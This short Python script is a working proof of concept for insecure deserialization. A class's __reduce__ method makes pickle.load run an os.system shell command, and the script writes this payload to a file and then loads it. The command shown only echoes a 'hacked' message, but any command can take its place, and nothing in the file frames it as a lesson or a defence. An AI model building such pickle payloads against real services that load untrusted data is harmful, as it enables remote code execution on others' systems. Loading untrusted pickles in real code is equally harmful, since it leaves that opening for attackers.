import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_exploit():
    with open('payload.dat', 'wb') as file:
        pickle.dump(VulnerableClass(), file)

def deserialize_exploit():
    with open('payload.dat', 'rb') as file:
        pickle.load(file)

serialize_exploit()
deserialize_exploit()
